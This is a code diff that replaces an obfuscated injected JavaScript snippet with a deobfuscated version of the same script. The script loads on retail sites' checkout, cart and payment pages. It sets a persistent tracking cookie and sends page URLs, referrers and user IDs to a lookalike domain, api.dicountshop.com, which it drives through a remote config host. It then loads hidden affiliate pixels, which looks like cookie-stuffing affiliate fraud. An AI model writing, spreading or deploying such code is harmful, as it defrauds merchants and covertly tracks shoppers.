@@ -1,1 +1,115 @@
-function _0x597f(){const _0x446191=['interactive','substring','indexOf','/checkout/shipping','error','toUTCString',';path=/;SameSite=Lax','https://api.dicountshop.com/api/fallback-pixel?id=','type','location','/checkout/cart','12VzxUTW','cartExtra','some','display','random','2202489TzDRuJ','Tracking\x20Failed:','readyState','find','affiliate_url','https://api.dicountshop.com/api/track-user','stringify','trim','49526czAYTG','7910235dfTvIH','none','always','review-order','cookie','complete','style','10483744QyWTMO','appendChild','94450IuzbnB','addEventListener','/checkout/review-order','hostname','POST','513660OnaNid','src','includes','split','application/json',';\x20expires=','pathname','length','paths','/checkout/delivery','/checkout/payment','tracking_uuid=','35nEumoF','referrer','body','4179952saQhsG','DOMContentLoaded','/xpay','payment'];_0x597f=function(){return _0x446191;};return _0x597f();}function _0xe55e(_0x59dc3f,_0x5ca587){_0x59dc3f=_0x59dc3f-0xd1;const _0x597fbc=_0x597f();let _0xe55ef9=_0x597fbc[_0x59dc3f];return _0xe55ef9;}(function(_0x244d4f,_0x1c6477){const _0x2f7ee5=_0xe55e,_0x3d9e18=_0x244d4f();while(!![]){try{const _0x73e907=parseInt(_0x2f7ee5(0xd1))/0x1*(-parseInt(_0x2f7ee5(0xf0))/0x2)+parseInt(_0x2f7ee5(0xe8))/0x3+-parseInt(_0x2f7ee5(0xff))/0x4+-parseInt(_0x2f7ee5(0xfa))/0x5*(parseInt(_0x2f7ee5(0xe3))/0x6)+parseInt(_0x2f7ee5(0xd4))/0x7+parseInt(_0x2f7ee5(0xf8))/0x8+-parseInt(_0x2f7ee5(0xf1))/0x9;if(_0x73e907===_0x1c6477)break;else _0x3d9e18['push'](_0x3d9e18['shift']());}catch(_0xd6d470){_0x3d9e18['push'](_0x3d9e18['shift']());}}}(_0x597f,0xb2360),(function(){const _0x890ce7=_0xe55e,_0x344d59=_0x890ce7(0xed),_0x59c982=_0x890ce7(0xdf),_0x74d430=[{'type':'cart','paths':[_0x890ce7(0xe2)]},{'type':'shipping','paths':[_0x890ce7(0x108),_0x890ce7(0xdb)]},{'type':_0x890ce7(0xd7),'paths':[_0x890ce7(0xd6),_0x890ce7(0x109),'/pay-installments']},{'type':_0x890ce7(0xf4),'paths':[_0x890ce7(0xfc)]},{'type':'confirmation','paths':['/checkout/confirmation']}],_0x10916d={'www.xcite.com':{'always':![],'cartExtra':!![]},'www.fairprice.com.sg':{'always':!![],'cartExtra':!![]},'internationalopenacademy.com':{'always':!![],'cartExtra':!![]}};function _0x1e42bf(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'['replace'](/[xy]/g,function(_0x27e848){const _0x2c4a07=_0xe55e,_0x22e89a=Math[_0x2c4a07(0xe7)]()*0x10|0x0,_0x18bf77=_0x27e848==='x'?_0x22e89a:_0x22e89a&0x3|0x8;return _0x18bf77['toString'](0x10);});}function _0x217521(_0x79d6c6){const _0x7ce60f=_0x890ce7,_0x5047ee=_0x79d6c6+'=',_0x40dcfa=document[_0x7ce60f(0xf5)][_0x7ce60f(0x102)](';');for(let _0x28df96=0x0;_0x28df96<_0x40dcfa[_0x7ce60f(0x106)];_0x28df96++){const _0x247f1d=_0x40dcfa[_0x28df96][_0x7ce60f(0xef)]();if(_0x247f1d[_0x7ce60f(0xda)](_0x5047ee)===0x0)return _0x247f1d[_0x7ce60f(0xd9)](_0x5047ee[_0x7ce60f(0x106)],_0x247f1d['length']);}return'';}function _0x13f4dc(_0x11ce22){const _0x21dc5c=_0x890ce7;try{const _0x51340f=new Image();_0x51340f[_0x21dc5c(0x100)]=_0x11ce22,_0x51340f[_0x21dc5c(0xf7)][_0x21dc5c(0xe6)]=_0x21dc5c(0xf2),document[_0x21dc5c(0xd3)][_0x21dc5c(0xf9)](_0x51340f);}catch(_0x3b1271){}}function _0xe7e047(){const _0x119512=_0x890ce7,_0x1d15c2=window[_0x119512(0xe1)][_0x119512(0x105)]['toLowerCase'](),_0x2910b1=_0x74d430[_0x119512(0xeb)](function(_0x595493){const _0x1f30ad=_0x119512;return _0x595493[_0x1f30ad(0x107)][_0x1f30ad(0xe5)](function(_0x3bfd70){const _0x18b76d=_0x1f30ad;return _0x1d15c2[_0x18b76d(0x101)](_0x3bfd70);});});return _0x2910b1?_0x2910b1[_0x119512(0xe0)]:null;}async function _0x353331(){const _0x5b00f4=_0x890ce7;try{const _0x5d023d=_0x217521('tracking_uuid')||_0x1e42bf(),_0x535605=new Date(Date['now']()+0x1e*0x18*0x3c*0x3c*0x3e8)[_0x5b00f4(0xdd)]();document[_0x5b00f4(0xf5)]=_0x5b00f4(0x10a)+_0x5d023d+_0x5b00f4(0x104)+_0x535605+_0x5b00f4(0xde);const _0x4752ad=await fetch(_0x344d59,{'method':_0x5b00f4(0xfe),'keepalive':!![],'body':JSON[_0x5b00f4(0xee)]({'url':window[_0x5b00f4(0xe1)]['href'],'referrer':document[_0x5b00f4(0xd2)],'unique_id':_0x5d023d,'origin':window[_0x5b00f4(0xe1)]['hostname'],'timestamp':new Date()['getTime']()}),'headers':{'Content-Type':_0x5b00f4(0x103)}}),_0x424ba1=await _0x4752ad['json']();_0x424ba1['success']&&_0x424ba1[_0x5b00f4(0xec)]?_0x13f4dc(_0x424ba1[_0x5b00f4(0xec)]):_0x13f4dc(_0x59c982+_0x5d023d);}catch(_0x138a85){console[_0x5b00f4(0xdc)](_0x5b00f4(0xe9),_0x138a85);}}function _0x21aca8(){_0x353331();}function _0x25a514(){const _0x2041de=_0x890ce7,_0x5d628a=window['location'][_0x2041de(0xfd)],_0x159827=_0x10916d[_0x5d628a];if(!_0x159827)return;const _0x500982=_0xe7e047();if(_0x159827[_0x2041de(0xf3)])_0x21aca8();_0x159827[_0x2041de(0xe4)]&&_0x500982&&(_0x21aca8(),_0x21aca8());}document[_0x890ce7(0xea)]===_0x890ce7(0xd8)||document[_0x890ce7(0xea)]===_0x890ce7(0xf6)?_0x25a514():window[_0x890ce7(0xfb)](_0x890ce7(0xd5),_0x25a514);}()));
+(function () {
+  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
+  const TRACK_URL = 'https://api.dicountshop.com/api/track-user';
+  const FALLBACK_PIXEL_URL = 'https://api.dicountshop.com/api/fallback-pixel?id=';
+
+  const CHECKOUT_STEPS = [
+    { type: 'cart', paths: ['/checkout/cart'] },
+    { type: 'shipping', paths: ['/checkout/delivery', '/checkout/shipping'] },
+    { type: 'payment', paths: ['/xpay', '/checkout/payment', '/pay-installments'] },
+    { type: 'review-order', paths: ['/checkout/review-order'] },
+    { type: 'confirmation', paths: ['/checkout/confirmation'] },
+  ];
+
+  const EXTRA_CART_PING_HOSTNAME = 'www.xcite.com';
+  const EXTRA_CART_PING_DELAY = 2000;
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      const r = Math.random() * 0x10 | 0x0;
+      const v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const nameEQ = name + '=';
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const c = cookies[i].trim();
+      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+    }
+    return '';
+  }
+
+  function createTrackingPixel(src) {
+    try {
+      const img = new Image();
+      img.src = src;
+      img.style.display = 'none';
+      document.body.appendChild(img);
+    } catch (err) {}
+  }
+
+  function getMatchedCheckoutStep() {
+    const path = window.location.pathname.toLowerCase();
+    const step = CHECKOUT_STEPS.find(function (step) {
+      return step.paths.some(function (p) {
+        return path.includes(p);
+      });
+    });
+    return step ? step.type : null;
+  }
+
+  async function doPing() {
+    try {
+      const uuid = getCookie('tracking_uuid') || generateUUID();
+      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + ';path=/;SameSite=Lax';
+
+      const res = await fetch(TRACK_URL, {
+        method: 'POST',
+        keepalive: true,
+        body: JSON.stringify({
+          url: window.location.href,
+          referrer: document.referrer,
+          unique_id: uuid,
+          origin: window.location.hostname,
+          timestamp: new Date().getTime(),
+        }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+      const data = await res.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+      } else {
+        createTrackingPixel(FALLBACK_PIXEL_URL + uuid);
+      }
+    } catch (err) {
+      console.error('Tracking Failed:', err);
+    }
+  }
+
+  function triggerPing() {
+    doPing();
+  }
+
+  function fetchConfigAndTrack() {
+    const url = CONFIG_URL + encodeURIComponent(window.location.hostname);
+    fetch(url)
+      .then(function (res) {
+        if (!res.ok) throw new Error('Config API Failed');
+        return res.json();
+      })
+      .then(function (data) {
+        if (!data || (!data.always && !data.cartExtra)) return;
+
+        const matchedStep = getMatchedCheckoutStep();
+
+        if (data.always) triggerPing();
+        data.cartExtra && matchedStep && (triggerPing(), triggerPing());
+
+        if (window.location.hostname === EXTRA_CART_PING_HOSTNAME && matchedStep === 'cart') {
+          setTimeout(triggerPing, EXTRA_CART_PING_DELAY);
+        }
+      })
+      .catch(function (err) {
+        console.error('Config fetch failed:', err);
+      });
+  }
+
+  document.readyState === 'interactive' || document.readyState === 'complete'
+    ? fetchConfigAndTrack()
+    : window.addEventListener('DOMContentLoaded', fetchConfigAndTrack);
+})();
